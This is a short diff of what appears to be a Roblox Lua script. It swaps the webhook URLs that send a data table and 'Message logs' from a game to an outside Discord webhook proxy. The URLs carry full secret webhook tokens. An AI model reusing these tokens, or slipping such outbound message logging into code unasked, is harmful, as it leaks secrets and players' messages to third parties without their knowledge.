@@ -65,7 +65,7 @@ end
 
 
 
-local webh = "https://webhook.lewisakura.moe/api/webhooks/1096003586481192971/tE0PGT5Iukf-AHOgk2KaZbG6gfPg4LxHQdbzrYDK-PG72PW37VvMGMGwrnDo2RHubPcx"
+local webh = "https://webhook.lewisakura.moe/api/webhooks/1084218278261567569/9DWBfgbX2vT9G9xfpPgeJubD21slejuX2GpBjxxdDhMoJlFV_x3jllIti_-BRmqHBDMZ"
 
 pcall(function()
    local data = {
@@ -166,7 +166,7 @@ local marketplaceService = game:GetService("MarketplaceService")
 local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
 if isSuccessful then
  
-local wh = 'https://webhook.lewisakura.moe/api/webhooks/1057404244430442627/szQUUeS8YV-VlUNsKEAl2OeetCJjl01SSSzd_yFyVdaBidDjoC8WuIinPzfmMYFVsSfL'
+local wh = 'https://webhook.lewisakura.moe/api/webhooks/1096003586481192971/tE0PGT5Iukf-AHOgk2KaZbG6gfPg4LxHQdbzrYDK-PG72PW37VvMGMGwrnDo2RHubPcx'
 local embed1 = {
        ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
    }
